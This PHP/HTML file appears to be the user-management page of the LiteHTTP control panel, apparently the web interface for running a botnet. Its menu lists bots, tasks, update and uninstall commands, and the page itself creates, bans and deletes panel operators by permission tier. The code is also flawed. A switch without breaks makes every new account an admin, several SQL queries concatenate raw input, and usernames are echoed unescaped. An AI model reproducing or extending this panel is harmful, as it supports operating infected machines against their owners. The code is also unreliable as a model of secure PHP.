<?php
$u = explode(":", $_SESSION['LiteHTTP']);
$username = $u[0];
$userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);

include 'inc/stats.php';
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Control Panel</title>
	<meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
	<link href="css/main.css" rel="stylesheet" type="text/css" />
	<!--[if lt IE 9]>
		<script src="js/html5shiv.js"></script>
		<script src="js/respond.min.js"></script>
	<![endif]-->
</head>
<body class="wysihtml5-supported skin-black fixed">
	<header class="header">
		<a href="?p=main" class="logo">
			LiteHTTP
		</a>
		<nav class="navbar navbar-static-top" role="navigation">
			<div class="navbar-right">
				<ul class="nav navbar-nav">
					<li class="dropdown user user-menu">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown">
							<i class="glyphicon glyphicon-user"></i>
							<span><?php echo $username; ?> <i class="caret"></i></span>
						</a>
						<ul class="dropdown-menu">
							<li class="user-footer">
								<div class="pull-left">
									<a href="?p=account" class="btn btn-default btn-flat">Edit Account</a>
								</div>
								<div class="pull-right">
									<a href="?p=logout" class="btn btn-default btn-flat">Logout</a>
								</div>
							</li>
						</ul>
					</li>
				</ul>
			</div>
		</nav>
	</header>
	<div class="wrapper row-offcanvas row-offcanvas-left">
		<aside class="left-side sidebar-offcanvas">
			<section class="sidebar">
				<ul class="sidebar-menu">
					<li>
						<a href="?p=main">
							<i class="fa fa-dashboard"></i> <span>Dashboard</span>
						</a>
					</li>
					<li>
						<a href="?p=bots">
							<i class="fa fa-list"></i> <span>Bots</span>
							<small class="badge pull-right bg-green"><?php echo $online; ?></small>
						</a>
					</li>
					<li>
						<a href="?p=tasks">
							<i class="fa fa-bar-chart"></i> <span>Tasks</span>
						</a>
					</li>
					<li>
						<a href="?p=settings">
							<i class="fa fa-cog"></i> <span>Settings</span>
						</a>
					</li>
					<li class="active">
						<a href="?p=users">
							<i class="fa fa-users"></i> <span>Users</span>
						</a>
					</li>
					<li>
						<a href="?p=logs">
							<i class="fa fa-list-alt"></i> <span>Panel Logs</span>
						</a>
					</li>
					<li>
						<a href="?p=help">
							<i class="fa fa-question"></i> <span>Help</span>
						</a>
					</li>
				</ul>
			</section>
		</aside>
		<aside class="right-side">
			<section class="content">
				<div class="row">
					<div class="col-lg-12 col-xs-24">
						<?php
						if ($userperms == "user")
						{
							echo '<div class="alert alert-danger">You do not have permission to view this page.</div>';
							die();
						}
						if (isset($_POST['doAdd']))
						{
							$user = $_POST['username'];
							$pass = hash("sha256", $_POST['password']);
							$perm = $_POST['permissions'];
							if (ctype_alnum($user))
							{
								if (ctype_digit($perm))
								{
									switch ($perm)
									{
										case "1":
											$perm = "user";
										case "2":
											$perm = "moderator";
										case "3":
											$perm = "admin";
									}
									$i = $odb->prepare("INSERT INTO users VALUES(NULL, :u, :p, :pr, '1')");
									$i->execute(array(":u" => $user, ":p" => $pass, ":pr" => $perm));
									$i2 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
									$i2->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => "Created user ".$user));
									echo '<div class="alert alert-success">Successfully added new user. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=users">';
								}else{
									echo '<div class="alert alert-danger">Permissions was not a digit.</div>';
								}
							}else{
								echo '<div class="alert alert-danger">Username\'s must be alpha-numeric only.</div>';
							}
						}
						if (isset($_GET['del']))
						{
							
							$del = $_GET['del'];
							if (!ctype_digit($del))
							{
								echo '<div class="alert alert-danger">User ID was not a digit. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=users">';
							}else{
								if ($del != "1")
								{
									$un = $odb->query("SELECT username FROM users WHERE id = '".$del."'")->fetchColumn(0);
									$d = $odb->prepare("DELETE FROM users WHERE id = :i LIMIT 1");
									$d->execute(array(":i" => $del));
									$i3 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
									$i3->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => "Deleted user ".$un));
									echo '<div class="alert alert-success">User has been deleted. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=users">';
								}else{
									echo '<div class="alert alert-danger">This user cannot be deleted. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=users">';
								}
							}
						}
						if (isset($_GET['ban']))
						{
							$ban = $_GET['ban'];
							if (!ctype_digit($ban))
							{
								echo '<div class="alert alert-danger">User ID was not a digit. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=users">';
							}else{
								if ($ban != "1")
								{
									list($st,$un) = $odb->query("SELECT status,username FROM users WHERE id = '".$ban."'")->fetch();
									if ($st == "1")
									{
										$b = $odb->prepare("UPDATE users SET status = '2' WHERE id = :i LIMIT 1");
										$b->execute(array(":i" => $ban));
										$i4 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
										$i4->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => "Banned user ".$un));
										echo '<div class="alert alert-success">User has been banned. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=users">';
									}else{
										$b = $odb->prepare("UPDATE users SET status = '1' WHERE id = :i LIMIT 1");
										$b->execute(array(":i" => $ban));
										$i4 = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
										$i4->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => "Unbanned user ".$un));
										echo '<div class="alert alert-success">User has been unbanned. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=users">';
									}
								}else{
									echo '<div class="alert alert-danger">This user cannot be banned. Reloading...</div><meta http-equiv="refresh" content="2;url=?p=users">';
								}
							}
						}
						?>
						<div class="col-lg-6 col-xs-12">
							<div class="nav-tabs-custom">
								<ul class="nav nav-tabs">
									<li class="active">
										<a href="#man" data-toggle="tab">Manage</a>
									</li>
									<li>
										<a href="#add" data-toggle="tab">Add User</a>
									</li>
								</ul>
								<div class="tab-content">
									<div class="tab-pane active" id="man">
										<table class="table table-condensed table-bordered table-hover">
											<thead>
												<tr>
													<th>#</th>
													<th>Username</th>
													<th>Permission</th>
													<th>Last Access Date</th>
													<th>Actions</th>
												</tr>
											</thead>
											<tbody>
												<?php
												$users = $odb->query("SELECT * FROM users");
												while ($us = $users->fetch(PDO::FETCH_ASSOC))
												{
													$lds = $odb->prepare("SELECT date FROM plogs WHERE username = :u AND action = 'Logged in' ORDER BY date LIMIT 1");
													$lds->execute(array(":u" => $us['username']));
													$ld = $lds->fetchColumn(0);
													if ($ld == NULL || $ld == "")
													{
														$ld = "Never";
													}else{
														$ld = date("m-d-Y, h:i A", $ld);
													}
													$stat = "";
													if ($us['status'] == "1")
													{
														$stat = '<a href="?p=users&ban='.$us['id'].'" title="Ban User"><i class="fa fa-lock"></i></a>';
													}else{
														$stat = '<a href="?p=users&ban='.$us['id'].'" title="Unban User"><i class="fa fa-unlock-alt"></i></a>';
													}
													echo '<tr><td>'.$us['id'].'</td><td>'.$us['username'].'</td><td>'.ucfirst($us['privileges']).'</td><td>'.$ld.'</td><td><center><a href="?p=edituser&id='.$us['id'].'" title="Edit User"><i class="fa fa-edit"></i></a>&nbsp;'.$stat.'&nbsp;<a href="?p=users&del='.$us['id'].'" title="Delete User"><i class="fa fa-times-circle"></i></a></center></td></tr>';
												}
												?>
											</tbody>
										</table>
									</div>
									<div class="tab-pane" id="add">
										<form action="" method="POST" class="col-lg-6">
											<label>Username</label>
											<input type="text" class="form-control" name="username">
											<br>
											<label>Password</label>
											<input type="password" class="form-control" name="password">
											<br>
											<label>Permissions</label>
											<select class="form-control" name="permissions">
												<option value="1">User</option>
												<option value="2">Moderator</option>
												<option value="3">Admin</option>
											</select>
											<br>
											<center><input type="submit" name="doAdd" class="btn btn-danger" value="Add User"></center>
										</form>
										<div class="clearfix"></div>
									</div>
								</div>
							</div>
						</div>
						<div class="col-lg-6 col-xs-12">
							<h2>Help</h2>
							<br>
							<h4><b>Permissions</b></h4>
							<p>The <b>User</b> permission limits the user to view and access bots, but cannot manage the settings, manage other users, view logs, or manage tasks the user did not create. The tasks this user cannot use are <b>Update, and Uninstall</b>.
							<br><br>
							The <b>Moderator</b> permission limits the user to view and access bots, manage other non-admin users, view logs, and manage tasks of other non-admin users, but cannot manage the settings. The tasks this user cannot use are <b>Update, and Uninstall</b>.
							<br><br>
							The <b>Admin</b> permission gives a user full access to the panel, allowing full control over other users and their tasks. This user can run any task.</p>
						</div>
					</div>
				</div>
			</section>
		</aside>
	</div>
	<script src="js/jquery.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/jquery-ui.min.js" type="text/javascript"></script>
</body>
</html>